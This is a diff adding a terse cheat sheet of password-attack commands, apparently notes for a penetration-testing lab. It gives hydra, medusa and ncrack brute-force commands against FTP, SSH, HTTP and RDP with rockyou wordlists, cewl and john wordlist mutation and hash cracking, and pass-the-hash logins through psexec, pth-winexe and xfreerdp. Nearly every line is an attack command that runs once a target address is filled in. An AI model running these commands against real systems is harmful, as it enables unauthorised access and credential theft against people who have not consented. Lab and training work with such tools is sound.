@@ -1,0 +1,44 @@
+FTP:
+hydra -L /usr/share/wordlists/names.txt -P /usr/share/wordlists/rockyou.txt 10.11.1. ftp
+
+SSH:
+hydra -L /usr/share/wordlists/names.txt -P /usr/share/wordlists/rockyou.txt 10.11.1. ssh
+
+
+HTTP:
+medusa -h 10.11.1. -U /usr/share/wordlists/names.txt -P /usr/share/wordlists/rockyou.txt -M http -m DIR:/something_here -T 10
+
+
+RDP:
+hydra -t 1 -V -f -L /usr/share/wordlists/names.txt -P /usr/share/wordlists/rockyou.txt rdp://10.11.1.
+ncrack -vv -U /usr/share/wordlists/names.txt -P /usr/share/wordlists/rockyou.txt rdp://10.11.1.
+
+Generating wordlists: 
+cewl http://10.11.1. -m 6 -w 10.11.1.cewl.txt
+
+To really get nasty
+john --wordlist=10.11.1.cewl.txt --rules --stdout >mutated.txt
+
+grep
+
+Hashing: 
+
+hash-identifier:
+hash:
+
+john --wordlist=/usr/share/wordlists/rockyou.txt {file}
+
+If any are left:
+
+john --rules --wordlist=/usr/share/wordlists/rockyou.txt (file)
+
+
+Pass-zeeee-hash:
+
+psexec on msfconsole
+
+export SMBHASH=(HASH)
+
+pth-winexe -U name%hash //10.11.1. cmd.exe
+
+xfreerdp /u:admin /d:win2012 /pth:(hash) /v:10.11.1 
